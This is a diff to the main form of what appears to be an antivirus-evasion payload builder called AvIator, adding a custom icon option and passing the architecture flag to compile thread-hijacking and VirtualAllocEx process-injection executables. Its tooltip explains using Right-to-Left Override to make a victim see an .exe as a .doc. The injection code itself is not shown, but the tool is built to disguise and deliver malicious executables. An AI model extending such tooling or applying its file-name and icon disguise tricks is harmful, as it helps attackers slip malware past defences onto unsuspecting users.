@@ -1,11 +1,22 @@
 ﻿using System;
 using System.Windows.Forms;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
 
-namespace WindowsFormsApp1
+namespace AvIator
 {
+
+
+
     public partial class Form1 : Form
     {
-        private String filepath = null;
+        [DllImport("shell32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.Winapi)]
+        private static extern int PickIconDlg(IntPtr hwndOwner, System.Text.StringBuilder lpstrFile, int nMaxFile, ref int lpdwIconIndex);
+
+        private String filepath;
+
+        string iconfile; 
+
         public Form1()
         {
             InitializeComponent();
@@ -13,6 +24,7 @@ namespace WindowsFormsApp1
 
         private void buton1_click(object sender, EventArgs e)
         {
+            
 
             String[] initKey = keyBox.Text.Split(',');
             Byte[] initKeyB = hexStrToByteArray(initKey);
@@ -62,8 +74,12 @@ namespace WindowsFormsApp1
             VirtualAllocEx_existing_APP_Tech virtualAllocEx_existing = null;
 
             if (archX64.Checked)
-                architecture = " /platform:x64";
-            else architecture = " /platform:x86";
+                architecture = " /platform:x64 /optimize";
+            else
+                architecture = " /platform:x86 /optimize";
+
+            if(iconfile != null)
+                architecture += " /win32icon:" + iconfile;
             try
             {
                 if (virtualAlloc_Option.Checked)
@@ -89,18 +105,18 @@ namespace WindowsFormsApp1
                     procBox.Enabled = true;
                     
                     thrHijacking = new ThreadHijacking(keyBox.Text, resultBox.Text.Replace("\r\n", ""),procBox.Text);
-                    compiler.compileToExe(thrHijacking.GetCode(), keyBox.Text, filepath, " /platform:x64 /optimize");
+                    compiler.compileToExe(thrHijacking.GetCode(), keyBox.Text, filepath, architecture);
                 }
                 else if(threadHijackin_x86.Checked)
                 {
                     procBox.Text = "notepad.ex(32)";
                     thrHijackingx86 = new ThreadHijackingX86(keyBox.Text, resultBox.Text.Replace("\r\n", ""), procBox.Text);
-                    compiler.compileToExe(thrHijackingx86.GetCode(), keyBox.Text, filepath, " /platform:x86 /optimize");
+                    compiler.compileToExe(thrHijackingx86.GetCode(), keyBox.Text, filepath, architecture);
 
 
                 }
                 MessageBox.Show("The operation completed successfully", "AV/\tor");
-
+                iconfile = null;
             }
 
             catch (Exception er)
@@ -112,6 +128,10 @@ namespace WindowsFormsApp1
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            LinkLabel.Link link = new LinkLabel.Link();
+            link.LinkData = "https://twitter.com/Ch0pin";
+            linkLabel1.Links.Add(link);
+            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
             genExe.Enabled = false;
             RTLOtip.SetToolTip(RTLOCheckBox, "RIGHT TO LEFT OVERRIDE is a Unicode mainly used for the writing and the reading of Arabic or Hebrew text.\n " +
                 "It is used to disguise the names of files. For example the file testcod.exe will be displayed to the victim as testexe.doc");
@@ -151,7 +171,7 @@ namespace WindowsFormsApp1
         private void virtualAllocEx_Option_CheckedChanged(object sender, EventArgs e)
         {
             if (virtualAllocEx_Option.Checked)
-                procBox.Text = "notepad.exe(32)";
+                procBox.Text = "notepad.exe (32)";
             else if (virtualAlloc_Option.Checked)
                 procBox.Text = "none";
             procBox.Enabled = false;
@@ -172,11 +192,34 @@ namespace WindowsFormsApp1
 
         private void threadHijackin_x86_CheckedChanged(object sender, EventArgs e)
         {
-            procBox.Text = "notepad.exe(32)";
+            procBox.Text = "notepad.exe (32)";
         }
 
         private void groupBox1_Enter(object sender, EventArgs e)
         {
+
+        }
+
+        private void groupBox4_Enter(object sender, EventArgs e)
+        {
+
+        }
+
+        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            Process.Start(e.Link.LinkData as string);
+        }
+
+        private void button2_Click_1(object sender, EventArgs e)
+        {
+
+            OpenFileDialog openFileDlg = new OpenFileDialog();
+            openFileDlg.Title = "Choose a custom icon";
+
+            openFileDlg.Filter = "icon files (*.ico)|*.ico";
+            if (openFileDlg.ShowDialog() == DialogResult.OK)
+                iconfile = openFileDlg.FileName;
+
 
         }
     }
